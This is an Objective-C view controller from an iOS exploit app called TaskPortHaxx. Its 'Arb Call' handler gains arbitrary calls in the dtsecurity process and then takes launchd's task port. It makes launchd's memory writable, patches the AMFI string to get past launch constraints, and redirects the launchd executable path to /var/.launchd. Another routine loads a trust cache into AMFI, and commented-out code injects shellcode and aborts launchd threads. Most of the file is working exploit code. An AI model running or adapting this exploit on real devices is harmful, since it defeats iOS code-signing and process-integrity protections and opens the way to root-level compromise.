//
//  ViewController.m
//  TaskPortHaxxApp
//
//  Created by Duy Tran on 24/10/25.
//

@import Darwin;
@import MachO;
@import XPC;
#import <IOKit/IOKitLib.h>
#import "ViewController.h"
#include "Header.h"
#include <sys/wait.h>

#define PT_CONTINUE     7       /* continue the child */
#define PT_ATTACHEXC    14      /* attach to running process with signal exception */


#define PROC_PIDPATHINFO_SIZE           (MAXPATHLEN)
#define PROC_PIDPATHINFO_MAXSIZE        (4 * MAXPATHLEN)
extern int proc_listallpids(void *, int);
extern int proc_pidpath(int, void *, uint32_t);

pid_t find_process_pid(const char* executePath) {
    pid_t pids[4096];
    int count = proc_listallpids(pids, sizeof(pids));
    pid_t max_pid = 0;

    for (int i = 0; i < count; i++) {
        char path[PROC_PIDPATHINFO_MAXSIZE];
        if (proc_pidpath(pids[i], path, sizeof(path)) > 0 &&
            strstr(path, executePath)) {
            if (pids[i] > max_pid)
                max_pid = pids[i];
        }
    }
    return max_pid;
}

NSDictionary *getLaunchdStringOffsets(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    
    char *path = "/sbin/launchd";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    const struct mach_header_64 *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    size_t size = 0;
    char *cstring = (char *)getsectiondata(map, SEG_TEXT, "__cstring", &size);
    assert(cstring);
    while (size > 0) {
        dict[@(cstring)] = @(cstring - (char *)map);
        uint64_t off = strlen(cstring) + 1;
        cstring += off;
        size -= off;
    }
    
    munmap((void *)map, s.st_size);
    close(fd);
    return dict;
}

@interface ViewController ()
@property(nonatomic) mach_port_t exceptionPort;
@property(nonatomic) mach_port_t fakeBootstrapPort;
@property(nonatomic) pid_t childPid, sleepPid;
@property(nonatomic) UITextView *logTextView;
@end

@implementation ViewController

- (void)loadTrustCacheTapped {
    char *path = "/var/mobile/.TrustCache";
    int fd = open(path, O_RDONLY);
    struct stat s;
    fstat(fd, &s);
    void *map = mmap(NULL, s.st_size, PROT_READ, MAP_SHARED, fd, 0);
    assert(map != MAP_FAILED);
    
    CFDictionaryRef match = IOServiceMatching("AppleMobileFileIntegrity");
    io_service_t svc = IOServiceGetMatchingService(0, match);
    io_connect_t conn;
    IOServiceOpen(svc, mach_task_self_, 0, &conn);
    kern_return_t kr = IOConnectCallMethod(conn, 2, NULL, 0, map, s.st_size, NULL, NULL, NULL, NULL);
    if (kr != KERN_SUCCESS) {
        printf("IOConnectCallMethod failed: %s\n", mach_error_string(kr));
    } else {
        printf("Successfully loaded trust cache from %s\n", path);
    }
    IOServiceClose(conn);
    IOObjectRelease(svc);
    
    munmap((void *)map, s.st_size);
    close(fd);
}

- (void)viewDidLoad {
    [super viewDidLoad];
    self.navigationItem.title = @"Task Port Haxx";
    self.navigationItem.leftBarButtonItem = [[UIBarButtonItem alloc] initWithTitle:@"Options" menu:[UIMenu menuWithTitle:@"Options" children:@[
        [UIAction actionWithTitle:@"Change Signed Pointer" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self changePtrTapped];
        }],
        [UIAction actionWithTitle:@"Userspace reboot" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
            [self userspaceRebootTapped];
        }],
//        [UIAction actionWithTitle:@"Load Trust Cache" image:nil identifier:nil handler:^(__kindof UIAction * _Nonnull action) {
//            [self loadTrustCacheTapped];
//        }]
    ]]];
    self.navigationItem.rightBarButtonItems = @[
        [[UIBarButtonItem alloc] initWithTitle:@"Test" style:UIBarButtonItemStylePlain target:self action:@selector(testButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Arb Call" style:UIBarButtonItemStylePlain target:self action:@selector(arbCallButtonTapped)],
        [[UIBarButtonItem alloc] initWithTitle:@"Detach" style:UIBarButtonItemStylePlain target:self action:@selector(detachButtonTapped)]
    ];
    
    UITextView *textView = [[UITextView alloc] initWithFrame:self.view.bounds];
    textView.editable = NO;
    textView.autoresizingMask = UIViewAutoresizingFlexibleWidth | UIViewAutoresizingFlexibleHeight;
    textView.text = @"Log Output:\n";
    textView.font = [UIFont monospacedSystemFontOfSize:14 weight:UIFontWeightRegular];
    [self.view addSubview:textView];
    self.logTextView = textView;
    [self redirectStdio];
    
    // find launchd string offsets
    NSUserDefaults *defaults = NSUserDefaults.standardUserDefaults;
    if (!defaults.offsetLaunchdPath) {
        NSDictionary *offsets = getLaunchdStringOffsets();
        defaults.offsetLaunchdPath = [offsets[@"/sbin/launchd"] unsignedLongValue];
        // AMFI is only needed for iOS 17.0 to bypass launch constraint
        defaults.offsetAMFI = [offsets[@"AMFI"] unsignedLongValue];
        printf("Found launchd path string offset: 0x%lx\n", defaults.offsetLaunchdPath);
        if (defaults.offsetAMFI) {
            printf("Found AMFI string offset: 0x%lx\n", defaults.offsetAMFI);
        }
    }
    
    self.exceptionPort = setup_exception_server();
    self.fakeBootstrapPort = setup_fake_bootstrap_server();
    self.childPid = -1;
}

- (void)redirectStdio {
    setvbuf(stdout, 0, _IOLBF, 0); // make stdout line-buffered
    setvbuf(stderr, 0, _IONBF, 0); // make stderr unbuffered
    
    /* create the pipe and redirect stdout and stderr */
    static int pfd[2];
    pipe(pfd);
    dup2(pfd[1], fileno(stdout));
    dup2(pfd[1], fileno(stderr));
    
    /* create the logging thread */
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        ssize_t rsize;
        char buf[2048];
        while((rsize = read(pfd[0], buf, sizeof(buf)-1)) > 0) {
            if (rsize < 2048) {
                buf[rsize] = '\0';
            }
            NSString *logLine = [NSString stringWithUTF8String:buf];
            dispatch_async(dispatch_get_main_queue(), ^{
                self.logTextView.text = [self.logTextView.text stringByAppendingString:logLine];
                NSRange bottom = NSMakeRange(self.logTextView.text.length -1, 1);
                [self.logTextView scrollRangeToVisible:bottom];
            });
        }
    });
}

- (void)changePtrTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Change Signed Pointer" message:@"Enter new signed pointer and diversifier value (hex):" preferredStyle:UIAlertControllerStyleAlert];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Signed Pointer (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%lx", NSUserDefaults.standardUserDefaults.signedPointer];
    }];
    [alert addTextFieldWithConfigurationHandler:^(UITextField *textField) {
        textField.placeholder = @"Diversifier (hex)";
        textField.keyboardType = UIKeyboardTypeDefault;
        textField.text = [NSString stringWithFormat:@"0x%x", NSUserDefaults.standardUserDefaults.signedDiversifier];
    }];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:^(UIAlertAction *action) {
        UITextField *textField = alert.textFields.firstObject;
        NSUInteger signedPointer = strtoull(textField.text.UTF8String, NULL, 16);
        uint32_t diversifier = (uint32_t)strtoul(alert.textFields[1].text.UTF8String, NULL, 16);
        NSUserDefaults.standardUserDefaults.signedPointer = signedPointer;
        NSUserDefaults.standardUserDefaults.signedDiversifier = signedPointer ? diversifier : 0;
        printf("Set signed pointer to 0x%lx\n", signedPointer);
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:okAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)userspaceRebootTapped {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"Userspace Reboot" message:@"This will renew the PAC signature." preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *rebootAction = [UIAlertAction actionWithTitle:@"Reboot" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *action) {
        userspaceReboot();
    }];
    UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"Cancel" style:UIAlertActionStyleCancel handler:nil];
    [alert addAction:rebootAction];
    [alert addAction:cancelAction];
    [self presentViewController:alert animated:YES completion:nil];
}

- (void)testButtonTapped {
    if (getpgid(_childPid) > 0) {
        printf("Child already spawned with PID %d\n", self.childPid);
        return;
    }
    self.childPid = 0; // TODO: get pid
    launchTest(@"dtsecurity");
}

- (void)arbCallButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        if (getpgid(self.childPid) <= 0) {
            launchTest(@"dtsecurity");
        }

        pid_t dtsecurity_pid = 0;
        while(1) {
            dtsecurity_pid = find_process_pid("/var/db/com.apple.xpc.roleaccountd.staging/exec/TaskPortHaxx.xpc/com.apple.dt.instruments.dtsecurity");
            if(dtsecurity_pid != 0) break;
            usleep(100000);
        }
        printf("dtsecurity_pid = %d\n", dtsecurity_pid);
        RemoteArbCall(0x41414141);
        RemoteArbCall(0x41414141);
        RemoteArbCall(0x41414141);
        RemoteArbCall(0x41414141);
        RemoteArbCall(0x41414141);
        RemoteArbCall(0x41414141);
        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
        // RemoteArbCall(0x41414141);
        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
        // RemoteArbCall(0x41414141);
        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);
        // RemoteArbCall(0x41414141);
        // ptrace(PT_CONTINUE, dtsecurity_pid, (void*)1, 0);

        


        
        kern_return_t kr;
        
        // Create a region which holds temp data (should we use stack instead?)
        vm_size_t page_size = getpagesize();
        vm_address_t map = RemoteArbCall(mmap, 0, page_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
        if (!map) {
            printf("Failed to call mmap. Please try resetting pointer and try again\n");
            return;
        }
        printf("Mapped memory at 0x%lx\n", map);
        
        // Test mkdir
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        // Get my task port
        mach_port_t dtsecurity_task = (mach_port_t)RemoteArbCall(task_self_trap);
//        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, getpid(), map);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to get my task port\n");
//            return;
//        }
//        mach_port_t my_task = (mach_port_t)RemoteRead32(map);
        // Map the page we allocated in dtsecurity to this process
//        kr = (kern_return_t)RemoteArbCall(vm_remap, my_task, map, page_size, 0, VM_FLAGS_ANYWHERE, dtsecurity_task, map, false, map+8, map+12, VM_INHERIT_SHARE);
//        if (kr != KERN_SUCCESS) {
//            printf("Failed to create dtsecurity<->haxx shared mapping\n");
//            return;
//        }
//        vm_address_t local_map = RemoteRead64(map);
//        printf("Created shared mapping: 0x%lx\n", local_map);
//        printf("read: 0x%llx\n", *(uint64_t *)local_map);
        
        // Get dtsecurity dyld base for blr x19
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
         kr = (kern_return_t)RemoteArbCall(task_info, dtsecurity_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        vm_address_t remote_dyld_base;
        do {
            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
            // FIXME: why do I have to sleep a bit for dyld base to be available?
            usleep(100000);
        } while (remote_dyld_base == 0);
        printf("dtsecurity dyld base: 0x%lx\n", remote_dyld_base);
        
        // Get launchd task port
        kr = (kern_return_t)RemoteArbCall(task_for_pid, dtsecurity_task, 1, map);
        if (kr != KERN_SUCCESS) {
            printf("Failed to get launchd task port\n");
            return;
        }
        
        mach_port_t launchd_task = (mach_port_t)RemoteRead32(map);
        printf("Got launchd task port: %d\n", launchd_task);
        
        // Get remote dyld base
        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
        kr = (kern_return_t)RemoteArbCall(task_info, launchd_task, TASK_DYLD_INFO, map + 8, map);
        if (kr != KERN_SUCCESS) {
            printf("task_info failed\n");
            return;
        }
        remote_dyld_all_image_infos_addr = (void *)(RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr));
        printf("launchd dyld_all_image_infos_addr: %p\n", remote_dyld_all_image_infos_addr);
        
        // uint32_t infoArrayCount = &remote_dyld_all_image_infos_addr->infoArrayCount;
        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArrayCount, sizeof(uint32_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArrayCount failed\n");
            return;
        }
        uint32_t infoArrayCount = RemoteRead32(map);
        printf("launchd infoArrayCount: %u\n", infoArrayCount);
        
        //const struct dyld_image_info* infoArray = &remote_dyld_all_image_infos_addr->infoArray;
        kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, (mach_vm_address_t)&remote_dyld_all_image_infos_addr->infoArray, sizeof(uint64_t), map, map + 8);
        if (kr != KERN_SUCCESS) {
            printf("vm_read_overwrite _dyld_all_image_infos->infoArray failed\n");
            return;
        }
        
        // Enumerate images to find launchd base
        vm_address_t launchd_base = 0;
        vm_address_t infoArray = RemoteRead64(map);
        for (int i = 0; i < infoArrayCount; i++) {
            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, infoArray + sizeof(uint64_t[i*3]), sizeof(uint64_t), map, map + 8);
            uint64_t base = RemoteRead64(map);
            if (base % page_size) {
                // skip unaligned entries, as they are likely in dsc
                continue;
            }
            printf("Image[%d] = 0x%llx\n", i, base);
            // read magic, cputype, cpusubtype, filetype
            kr = (kern_return_t)RemoteArbCall(vm_read_overwrite, launchd_task, base, 16, map, map + 16);
            uint64_t magic = RemoteRead32(map);
            if (magic != MH_MAGIC_64) {
                printf("not a mach-o (magic: 0x%x)\n", (uint32_t)magic);
                continue;
            }
            uint32_t filetype = RemoteRead32(map + 12);
            if (filetype == MH_EXECUTE) {
                printf("found launchd executable at 0x%llx\n", base);
                launchd_base = base;
                break;
            }
        }
        
        // Reprotect rw
        // minimum page = 0x5f000;
        vm_offset_t launchd_str_off = NSUserDefaults.standardUserDefaults.offsetLaunchdPath;
        vm_offset_t amfi_str_off = NSUserDefaults.standardUserDefaults.offsetAMFI;
        
        printf("reprotecting 0x%lx\n", launchd_base + 0x5f000);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_protect, launchd_task, (launchd_base + 0x5f000), 0x4000*4, false, PROT_READ | PROT_WRITE | VM_PROT_COPY);
        if (kr != KERN_SUCCESS) {
            printf("vm_protect failed: kr = %s\n", mach_error_string(kr));
            sleep(5);
            return;
        }

        // https://github.com/wh1te4ever/TaskPortHaxxApp/commit/327022fe73089f366dcf1d0d75012e6288916b29
        // Bypass panic by launch constraints
        // Method 2: Patch `AMFI` string that being used as _amfi_launch_constraint_set_spawnattr's arguments

        // Patch string `AMFI`
        
        const char *newStr = "AAAA\x00";
        RemoteWriteString(map, newStr);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + amfi_str_off, map, 5);
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        RemoteTaskHexDump(launchd_base + amfi_str_off, 0x100, launchd_task, (uint64_t)map);

        // Overwrite /sbin/launchd string to /var/.launchd
        const char *newPath = "/var/.launchd";
        RemoteWriteString(map, newPath);
        RemoteChangeLR(0xFFFFFF00); // fix autibsp
        kr = (kern_return_t)RemoteArbCall(vm_write, launchd_task, launchd_base + launchd_str_off, map, strlen(newPath));
        if (kr != KERN_SUCCESS) {
            printf("vm_write failed\n");
            sleep(5);
            return;
        }
        printf("Successfully overwrote launchd executable path string to %s\n", newPath);

        RemoteArbCall(exit, 0);
        
        // stuff
//        uint64_t remote_list = map + sizeof(uint64_t);
//        RemoteArbCall(task_threads, launchd_task, remote_list, map);
//        mach_msg_type_number_t listCnt = *(uint32_t *)local_map;
//        RemoteArbCall(memcpy, remote_list, RemoteRead64(remote_list), listCnt * sizeof(uint64_t));
//        thread_act_array_t act_list = (void *)local_map + sizeof(uint64_t);
//        for (int i = 0; i < listCnt; i++) {
//            printf("Thread[%d] = 0x%x\n", i, act_list[i]);
//            // panic your launchd
//            RemoteArbCall(thread_abort, act_list[i]);
//        }
        
//        arm_thread_state64_internal ts;
//        RemoteArbCall(memset, map+0x10, 0x41, sizeof(ts));
//        kr = RemoteArbCall(thread_create_running, launchd_task, ARM_THREAD_STATE64, (uint64_t)(map+0x10), ARM_THREAD_STATE64_COUNT, (uint64_t)map);
//        printf("thread_create_running returned %d\n", kr);
//        thread_act_t tid = RemoteRead32(map);
//        printf("tid: 0x%x\n", tid);
        
//        printf("Sleeping...\n");
//        RemoteArbCall(sleep, 10);
        
        // Get remote dyld base for blr x19
//        mach_port_t remote_task = (mach_port_t)RemoteArbCall(task_self_trap);
//        RemoteWrite32((uint64_t)map, TASK_DYLD_INFO_COUNT);
//        kern_return_t kr = (kern_return_t)RemoteArbCall(task_info, remote_task, TASK_DYLD_INFO, map + 8, map);
//        if (kr != KERN_SUCCESS) {
//            printf("task_info failed\n");
//            return;
//        }
//        struct dyld_all_image_infos *remote_dyld_all_image_infos_addr = (void *)RemoteRead64(map + 8) + offsetof(struct task_dyld_info, all_image_info_addr);
//        vm_address_t remote_dyld_base;
//        do {
//            remote_dyld_base = RemoteRead64((uint64_t)&remote_dyld_all_image_infos_addr->dyldImageLoadAddress);
//            printf("Remote dyld base: 0x%lx\n", remote_dyld_base);
//            // FIXME: why do I have to sleep a bit for dyld base to be available?
//            usleep(100000);
//        } while (remote_dyld_base == 0);
//        blrX19Address = remote_dyld_base + blrX19Offset;
        
        // We have some unitialized variables in xpc since we crashed here, so we need to fix them up
//        RemoteArbCall(task_get_special_port, 0x203, TASK_BOOTSTRAP_PORT, map);
//        mach_port_t remote_bootstrap_port = RemoteRead32(map);
//        RemoteWriteString(map, "_os_alloc_once_table");
//        struct _os_alloc_once_s *remote_os_alloc_once_table = (struct _os_alloc_once_s *)RemoteArbCall(dlsym, (uint64_t)RTLD_DEFAULT, map);
//        struct xpc_global_data *globalData = (struct xpc_global_data *)RemoteArbCall(_os_alloc_once, (uint64_t)&remote_os_alloc_once_table[1], 472, 0);
//        RemoteWrite64((uint64_t)&remote_os_alloc_once_table[1].once, 0xFFFFFFFFFFFFFFFF);
//        vm_address_t xpc_bootstrap_pipe = RemoteArbCall(xpc_pipe_create_from_port, remote_bootstrap_port, 0);
//        //RemoteRead64((uint64_t)&globalData->xpc_bootstrap_pipe);
//        printf("xpc_bootstrap_pipe: 0x%lx\n", xpc_bootstrap_pipe);
//        RemoteWrite64((uint64_t)&globalData->xpc_bootstrap_pipe, xpc_bootstrap_pipe);
        
//        RemoteArbCall((void*)dlopen, 0x41414141, 0);
//        printf("--- MARK: DONE FUNCTION CALL ---\n");
//        RemoteWriteString(map, "/tmp/.it_works");
//        RemoteArbCall(mkdir, map, 0700);
        
        // submit a launch job to launchd to spawn a root process
        
        //(int)task_get_special_port((int)mach_task_self(), 4, &port); port
        // Can't JIT :(
//        void *ptrace = dlsym(RTLD_DEFAULT, "ptrace");
//        RemoteArbCall(ptrace, PT_ATTACHEXC, self.sleepPid, 0, 0);
//        RemoteArbCall(ptrace, PT_DETACH, self.sleepPid, 0, 0);
//        uint32_t shellcode[] = {
//            0xd2808880, // mov x0, #0x444
//            0xd65f03c0 // ret
//        };
//        RemoteWriteMemory(map, shellcode, sizeof(shellcode));
//        RemoteArbCall(mprotect, map, 0x4000, PROT_READ | PROT_EXEC);
//        _tmp_ptr = (uint64_t)map;
//        RemoteArbCall(((uint64_t (*)(void))map));
    });
}

- (void)detachButtonTapped {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        RemoteDetach();
    });
}

- (void)alertWithTitle:(NSString *)title message:(NSString *)message {
    UIAlertController *alert = [UIAlertController alertControllerWithTitle:title message:message preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *okAction = [UIAlertAction actionWithTitle:@"OK" style:UIAlertActionStyleDefault handler:nil];
    [alert addAction:okAction];
    [self presentViewController:alert animated:YES completion:nil];
}

@end
